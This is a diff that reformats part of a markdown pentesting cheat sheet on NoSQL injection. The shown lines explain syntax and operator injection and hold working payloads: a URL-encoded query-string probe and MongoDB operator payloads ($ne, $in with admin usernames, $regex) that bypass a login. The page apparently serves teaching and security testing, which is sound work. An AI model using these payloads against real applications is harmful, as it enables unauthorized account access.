@@ -22,9 +22,7 @@
 ### Types of NoSQL injection <a href="#types-of-nosql-injection" id="types-of-nosql-injection"></a>
 
 1. Syntax injection - when you can break the NoSQL query syntax, enabling the injection (likeSQLi).
-2.  Operator injection - when you can use NoSQL query operators to manipulate queries.
-
-
+2. Operator injection - when you can use NoSQL query operators to manipulate queries.
 
 ## NoSQL syntax injection <a href="#nosql-syntax-injection" id="nosql-syntax-injection"></a>
 
@@ -53,8 +51,6 @@ https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
 ```
 
 * If the application behaves differently suggests that the false condition impacts the query logic, but the true condition doesn't.
-
-
 
 ### **Overriding existing conditions**
 
@@ -101,24 +97,22 @@ https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
 
 
 
-**Testing**
+### **Testing**
+
+**Login bypass**
 
 * To test if you can bypass login try to use a valid credentials (example "bob:pass")
   * `{"username":"bob","password":{"$ne":"invalid"}}`
-  * If it works you can try to bypass login with other username\
-
+  * If it works you can try to bypass login with other username
 
 **Guess with usernames list**
 
 * To target an account, you can construct a payload that includes a known username, or a username that you've guessed:&#x20;
-  * `{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`\
-
+  * `{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`
 
 **Guess with regex**
 
 `{"username":{"$regex":"^adm"},"password":{"$ne":""}}`
-
-
 
 **Other tests**
 
